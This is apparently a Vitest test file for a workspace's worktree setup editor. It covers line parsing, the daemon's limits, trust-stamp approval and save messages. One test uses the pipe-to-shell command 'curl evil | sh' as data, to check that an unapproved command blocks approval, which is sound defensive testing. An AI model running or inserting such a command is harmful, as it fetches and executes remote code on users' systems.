import { describe, it, expect } from "vitest";
import {
  MAX_SETUP_LINES,
  MAX_SETUP_LINE_BYTES,
  editorDirty,
  editorLines,
  editorProblem,
  editorText,
  proposalText,
  reseededDraft,
  saveNote,
  setupSaveStamp,
} from "$lib/workspace/worktreeSetupEditor";
import { executionKeysHash, NO_EXECUTION_KEYS, type ExecutionKeys } from "$lib/workspace/workspaceTrust";
import { detectWorktreeSetup } from "$lib/workspace/worktreeSetupDetect";

describe("editor text", () => {
  it("is one command per line, trimmed, with blank spacing dropped", () => {
    expect(editorLines("  npm ci  \n\n(cd app && npm ci)\r\n   \n")).toEqual(["npm ci", "(cd app && npm ci)"]);
    expect(editorLines("")).toEqual([]);
    expect(editorText(["npm ci", "cargo fetch"])).toBe("npm ci\ncargo fetch");
    expect(editorLines(editorText(["a", "b"]))).toEqual(["a", "b"]);
  });

  it("is dirty only when the lines it would store differ from the declared ones", () => {
    expect(editorDirty("npm ci\n", ["npm ci"])).toBe(false);
    expect(editorDirty("  npm ci  ", ["npm ci"])).toBe(false);
    expect(editorDirty("npm ci\ncargo fetch", ["npm ci"])).toBe(true);
    // Order is what runs, so a reorder is a change.
    expect(editorDirty("cargo fetch\nnpm ci", ["npm ci", "cargo fetch"])).toBe(true);
    expect(editorDirty("", [])).toBe(false);
    expect(editorDirty("", ["npm ci"])).toBe(true);
  });

  it("follows the file while untouched, and keeps what the human is typing", () => {
    expect(reseededDraft("", null, "npm ci")).toBe("npm ci");
    expect(reseededDraft("npm ci", "npm ci", "npm ci\ncargo fetch")).toBe("npm ci\ncargo fetch");
    // Spacing alone is not an edit.
    expect(reseededDraft("npm ci\n", "npm ci", "make")).toBe("make");
    expect(reseededDraft("npm ci\nuv sync", "npm ci", "make")).toBe("npm ci\nuv sync");
  });

  it("fills from the proposal in proposal order", () => {
    const proposal = detectWorktreeSetup(["app/package-lock.json", "Cargo.lock"]);
    expect(proposalText(proposal)).toBe("cargo fetch\n(cd app && npm ci)");
  });
});

describe("editorProblem mirrors the daemon's limits", () => {
  it("accepts an ordinary setup and tabs", () => {
    expect(editorProblem(["npm ci", "make\tdeps"])).toBeNull();
    expect(editorProblem([])).toBeNull();
  });

  it("names too many lines, a control character and an over-long line", () => {
    const many = Array.from({ length: MAX_SETUP_LINES + 1 }, (_, i) => `echo ${i}`);
    expect(editorProblem(many)).toContain(`At most ${MAX_SETUP_LINES}`);
    expect(editorProblem(["npm ci", "echo \u001b[2J"])).toBe("Line 2 holds a control character.");
    expect(editorProblem(["x".repeat(MAX_SETUP_LINE_BYTES + 1)])).toContain("Line 1 is");
    // Bytes, not characters: the daemon counts UTF-8.
    expect(editorProblem(["é".repeat(MAX_SETUP_LINE_BYTES / 2 + 1)])).toContain("bytes");
  });
});

describe("setupSaveStamp", () => {
  const keys = (over: Partial<ExecutionKeys>): ExecutionKeys => ({ ...NO_EXECUTION_KEYS, ...over });
  const lines = ["npm ci"];

  it("approves the saved lines over an approved config", () => {
    const before = { keys: keys({ command: "claude", setup: ["make"] }), trusted: true };
    expect(setupSaveStamp(before, lines)).toEqual({
      stamp: executionKeysHash(keys({ command: "claude", setup: lines })),
    });
  });

  it("approves them when the setup is the only executable key, approved or not", () => {
    // An agent's proposal sat unapproved; the human just saved the editor
    // that showed every line.
    const before = { keys: keys({ setup: ["npm ci"] }), trusted: false };
    expect(setupSaveStamp(before, lines)).toEqual({ stamp: executionKeysHash(keys({ setup: lines })) });
  });

  it("leaves the marker alone when an unapproved command or file would ride along", () => {
    expect(setupSaveStamp({ keys: keys({ command: "curl evil | sh" }), trusted: false }, lines)).toBeNull();
    expect(setupSaveStamp({ keys: keys({ file: "EVIL.md" }), trusted: false }, lines)).toBeNull();
  });

  it("clears the marker for a config left with nothing executable", () => {
    expect(setupSaveStamp({ keys: keys({ setup: ["npm ci"] }), trusted: true }, [])).toEqual({ stamp: undefined });
  });
});

describe("saveNote", () => {
  it("says what the save did and whether the lines will run", () => {
    expect(saveNote({ written: false, lines: ["npm ci"] }, false)).toContain("already declares");
    expect(saveNote({ written: true, lines: [] }, true)).toContain("no [worktree] setup");
    expect(saveNote({ written: true, lines: ["npm ci"] }, true)).toContain("approved");
    expect(saveNote({ written: true, lines: ["npm ci"] }, false)).toContain("Approve");
  });
});
